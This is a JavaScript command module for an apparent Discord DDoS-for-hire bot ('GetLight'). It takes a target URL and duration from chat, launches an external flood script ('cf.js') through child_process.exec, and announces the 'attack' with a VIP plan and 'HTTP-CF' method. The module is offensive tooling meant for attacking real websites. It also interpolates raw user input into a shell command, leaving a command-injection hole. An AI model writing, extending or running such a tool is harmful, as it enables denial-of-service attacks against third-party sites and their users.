﻿const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex .HTTP-CF https://example.com/ 60`")
	.setFooter("Please do not attack government website!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`node cf.js ${host} ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⭐️ **GetLight** ⭐️')
	.setTimestamp()
  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 🎃` \n **𝐓𝐚𝐫𝐠𝐞𝐭** : `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝𝐬** : `𝐇𝐓𝐓𝐏-𝐂𝐅 👽` \n **𝐓𝐈𝐌𝐄** : `" + duration + "`")
	.setFooter('© Developer: Cloxdyw', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media.giphy.com/media/WMiSdSm5fEAI3z5gd0/giphy.gif", "https://media.giphy.com/media/WMiSdSm5fEAI3z5gd0/giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/LHzau5s16pUr1On14y/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⭐️ **GetLight** ⭐️')
	.setTimestamp()
	.setDescription("**► 𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧 ~~ **")
	.setFooter('© Developer GetLight', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['HTTP-CF'],
  permLevel: 0
}

exports.help = {
  name: 'HTTP-CF',
  description: 'Rabbitx',
  usage: 'HTTP-CF'
}
